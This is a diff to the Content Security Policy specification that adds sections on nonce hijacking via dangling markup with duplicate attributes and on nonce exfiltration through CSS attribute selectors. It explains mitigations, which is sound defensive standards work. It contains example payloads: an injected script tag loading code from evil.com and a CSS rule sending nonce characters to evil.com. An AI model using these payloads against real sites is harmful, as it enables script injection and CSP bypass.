@@ -4242,7 +4242,7 @@ spec: INFRA; urlPrefix: https://infra.spec.whatwg.org/
 
   Given an {{Element}} (|element|), this algorithm returns "`Nonceable`" if
   a <a grammar>`nonce-source`</a> expression can match the element (as discussed
-  in [[#security-nonce-stealing]]), and "`Not Nonceable`" if such expressions
+  in [[#security-nonce-hijacking]]), and "`Not Nonceable`" if such expressions
   should not be applied.
 
   1.  If |element| does not have an attribute named "`nonce`", return "`Not
@@ -4635,7 +4635,9 @@ spec: INFRA; urlPrefix: https://infra.spec.whatwg.org/
   <a grammar>'unsafe-inline'</a>, authors are encouraged to consider nonces
   (or hashes) instead.
 
-  <h3 id="security-nonce-stealing">Nonce Stealing</h3>
+  <h3 id="security-nonce-hijacking">Nonce Hijacking</h3>
+
+  <h4 id="dangling-markup-attacks">Dangling markup attacks</h4>
 
   Dangling markup attacks such as those discussed in [[FILEDESCRIPTOR-2015]]
   can be used to repurpose a page's legitimate nonces for injections. For
@@ -4662,6 +4664,48 @@ spec: INFRA; urlPrefix: https://infra.spec.whatwg.org/
   The [[#is-element-nonceable]] algorithm attempts to mitigate this specific
   attack by walking through <{script}> or <{style}> element attributes, looking for the
   string "<code>&lt;script</code>" or "<code>&lt;style</code>" in their names or values.
+
+  User-agents must pay particular attention when implementing this algorithm to
+  not ignore duplicate attributes. If an element has a duplicate attribute any
+  instance of the attribute after the first one is ignored but in the
+  [[#is-element-nonceable]] algorithm, all attributes including the
+  duplicate ones need to be checked.
+
+  ISSUE(whatwg/html#3257): Currently the HTML spec's parsing algorithm removes this information
+  before the [[#is-element-nonceable]] algorithm can be run which makes it
+  impossible to actually detect duplicate attributes.
+
+  For the following example page:
+
+  <pre highlight="html">
+    Hello, [INJECTION POINT]
+    &lt;script nonce=abc src=/good.js&gt;&lt;/script&gt;
+  </pre>
+
+  The following injected string will use a duplicate attribute to attempt to
+  bypass the [[#is-element-nonceable]] algorithm check:
+
+  <pre highlight="html">
+    Hello, &lt;script src='https://evil.com/evil.js' x="" x=
+    &lt;script nonce="abcd" src=/good.js&gt;&lt;/script&gt;
+  </pre>
+
+  <h4 id="nonce-exfiltration-content-attributes">Nonce exfiltration via content attributes</h4>
+
+  Some attacks on CSP rely on the ability to exfiltrate
+  nonce data via various mechanisms that can read content attributes.
+  CSS selectors are the best example: through clever use of
+  prefix/postfix text matching selectors values can be sent out to an
+  attacker's server for reuse. Example:
+
+  <pre highlight="css">
+    script[nonce=a] { background: url("https://evil.com/nonce?a");}
+  </pre>
+
+  The <{htmlsvg-global/nonce}> section talks about mitigating these types
+  of attacks by hiding the nonce from the element's content attribute and
+  moving it into an internal slot. This is done to ensure that the `nonce`
+  value is exposed to scripts but not any other non-script channels.
 
   <h3 id="security-nonce-retargeting">Nonce Retargeting</h3>
 
